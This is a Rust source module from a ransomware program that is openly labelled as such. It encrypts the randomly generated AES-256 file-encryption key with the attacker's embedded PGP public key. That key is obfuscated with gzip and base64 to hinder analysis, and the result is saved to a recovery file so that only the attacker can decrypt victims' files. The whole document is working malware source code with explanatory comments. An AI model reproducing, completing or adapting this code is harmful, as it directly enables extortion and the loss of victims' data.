//! # Recovery Key Management Module
//!
//! This module implements PGP-based session key protection, ensuring that only
//! the attacker (holding the private key) can decrypt the randomly generated
//! AES-256 session key used for file encryption.
//!
//! ## Hybrid Encryption Architecture
//!
//! The ransomware uses a hybrid encryption scheme:
//! 1. **Symmetric (AES-256)**: Fast bulk file encryption with randomly generated session key
//! 2. **Asymmetric (PGP/RSA)**: Protects the session key - only private key holder can decrypt
//!
//! ## PGP Public Key Obfuscation
//!
//! The attacker's public key is embedded in the binary using multi-layer obfuscation:
//! - **Gzip Compression**: Reduces key size and obfuscates structure
//! - **Base64 Encoding**: Makes binary representation printable/embeddable as string
//! - **Const String**: Embedded at compile time in `PUB_KEY_ENCODED`
//!
//! This makes static analysis and key extraction more difficult.
//!
//! ## Recovery File Format
//!
//! The recovery file (`~/.local/share/recovery_file.txt.key` on Linux) contains:
//! - PGP-encrypted session key (SEIPD v1 format)
//! - Encrypted using attacker's public key
//! - Can only be decrypted with attacker's private key
//!
//! ## Security Properties
//!
//! - **No Key Escrow**: Session key never stored in plaintext
//! - **Forward Secrecy**: Each ransomware execution generates a new session key
//! - **Public Key Crypto**: Victim cannot decrypt files without attacker's private key

use aes_gcm::aead::OsRng;
use base64::{Engine as _, engine::general_purpose};
use dirs2::data_dir;
use flate2::read::GzDecoder;
use pgp::{
    composed::{Deserializable, MessageBuilder, SignedPublicKey},
    crypto::sym::SymmetricKeyAlgorithm,
};
use std::{
    fs::File,
    io::{Error, Read, Result, Write},
};

/// Embedded PGP public key (Gzip + Base64 encoded).
///
/// This is the attacker's public key embedded at compile time. It is:
/// - **Gzip-compressed** to reduce size and obfuscate structure
/// - **Base64-encoded** to allow embedding as a Rust string literal
/// - **Used to encrypt** the random AES-256 session key
///
/// Decoding process: Base64 decode → Gzip decompress → PGP ASCII armor parse
pub const PUB_KEY_ENCODED: &str = r#"H4sIAAAAAAAAA32ST4+iQBDF7/0pvBMDKCoe5tDdtNAgCChgc4PWaRH8P4jw6YdxL5vd7FZSSeVVUqn3yxsO+0LEpN7AN/2BH6ElxQOHsAFarrDzsx0CcDJcknmhYSFmOw1DCFpZ2OgIBjvo6hK/u/rM2vM2Tgq5lDJJiavyqn2S85WU5eglgMOLLuhaZUnSa25WDTd1EZwW535+5qdS+OaPPi9YsntkybzO1lrjlajhp7mSj7Qa5EkkFTYj5MUcaGgJDYKbLh35J+NT+aaO7LVRrpOvpHiJ7hxE+P0tpDlsIhtlqwwIGC1xICwoWIxFSXFDyUJQAwZ03/dWQOjg8LcjuYuhr9VCPvq3dKYDtXD512aNGFrMR5vdqbvcTexUT0ml51QondsQOJFni4ksSewW1fQSp7m6j57Vvar5RAFY9TbKBnWuWngKTLQVDC8qcTkRlzsShMB0F8MgekPVJx1tqcNqqt7Ddn7parUEwe7A8bS6tXgV8YQ/CreGDMPegrAKSyMm6tlg9k824E84BvwF5y/v2TTvvbf1qbo7K3n7UA/j7dLUQSSiw1hRwoks0iqNrCr0ckXz2is0JG/8nDt8pdVxVzuezY8ty5t2bG1nz1c4my5Uv1WAvQ0dEZQf4MMrrxy840U84z/Z+wZTTypjoQIAAA=="#;

/// Encrypts and saves the AES-256 session key using PGP public key cryptography.
///
/// This function protects the session key with the attacker's public key, ensuring
/// that only the holder of the corresponding private key can recover the key and
/// decrypt the victim's files.
///
/// # Process
///
/// 1. **Decode Embedded Key**: Base64 decode → Gzip decompress → PGP ASCII armor parse
/// 2. **Encrypt Session Key**: Use PGP to encrypt the AES-256 key with SEIPD v1 (Symmetric-Key Encrypted Integrity Protected Data)
/// 3. **Save Recovery File**: Write encrypted key to `~/.local/share/recovery_file.txt.key` (Linux) or equivalent on Windows
///
/// # Arguments
///
/// * `key` - The AES-256 session key to protect (32 bytes)
///
/// # Returns
///
/// * `Ok(())` - Recovery file successfully created
/// * `Err(Error)` - Failed to decode public key, encrypt, or write recovery file
///
/// # Errors
///
/// - `Failed to decode public key` - Base64 decoding failed (corrupted `PUB_KEY_ENCODED`)
/// - `Failed to convert decoded public key to string` - Invalid UTF-8 after Base64 decode
/// - `Failed to unzip public key` - Gzip decompression failed
/// - `Could not read public key` - PGP ASCII armor parsing failed
/// - `recovery key encryption failure` - PGP encryption operation failed
/// - `Missing data dir` - Cannot resolve system data directory path
/// - `Failed to convert msg to vectore` \[sic\] - PGP message serialization failed
///
/// # Security Notes
///
/// - **Symmetric Algorithm**: Uses AES-256 for PGP message encryption (inner layer)
/// - **Asymmetric Protection**: Outer layer uses RSA (from PGP key) to protect AES-256 symmetric key
/// - **SEIPD v1**: Provides both encryption and integrity protection for the session key
/// - **Random Padding**: `OsRng` used for both symmetric and asymmetric operations
///
/// # File Location
///
/// - **Linux**: `~/.local/share/recovery_file.txt.key`
/// - **Windows**: `%APPDATA%\recovery_file.txt.key` (typically `C:\Users\<user>\AppData\Roaming\`)
pub fn save_key(key: Vec<u8>) -> Result<()> {
    // Decode Base64-encoded public key
    let decoded_key = general_purpose::STANDARD
        .decode(PUB_KEY_ENCODED)
        .map_err(|_| Error::other("Failed to decode public key"))?;

    // Convert decoded bytes to UTF-8 string (Gzip format is binary-safe)
    let decoded_key_str = String::from_utf8(decoded_key)
        .map_err(|_| Error::other("Failed to convert decoded public key to string"))?;

    // Decompress Gzip-encoded public key
    let mut gz = GzDecoder::new(decoded_key_str.as_bytes());
    let mut unzipped_key = String::new();
    gz.read_to_string(&mut unzipped_key)
        .map_err(|_| Error::other("Failed to unzip public key"))?;

    // Parse PGP ASCII armor format
    let (public_key, _) = SignedPublicKey::from_string(&unzipped_key)
        .map_err(|_| Error::other("Could not read public key"))?;

    // Encrypt session key using PGP (SEIPD v1 = Symmetric-Key Encrypted Integrity Protected Data)
    // Uses AES-256 for message encryption, then encrypts that key with RSA public key
    let mut msg =
        MessageBuilder::from_bytes("", key).seipd_v1(OsRng, SymmetricKeyAlgorithm::AES256);

    msg.encrypt_to_key(OsRng, &public_key)
        .expect("recovery key encryption failure");

    // Construct recovery file path (OS-specific data directory)
    let mut data_dir = data_dir().expect("Missing dara dir"); // [sic] - original typo preserved
    data_dir.push("recovery_file");
    data_dir.set_extension("txt.key");

    let mut recovery_file = File::create(data_dir)?;

    // Serialize encrypted PGP message and write to file
    recovery_file.write_all(
        &msg.to_vec(OsRng)
            .map_err(|_| Error::other("Failed to convert msg to vectore"))?, // [sic] - original typo preserved
    )?;
    Ok(())
}
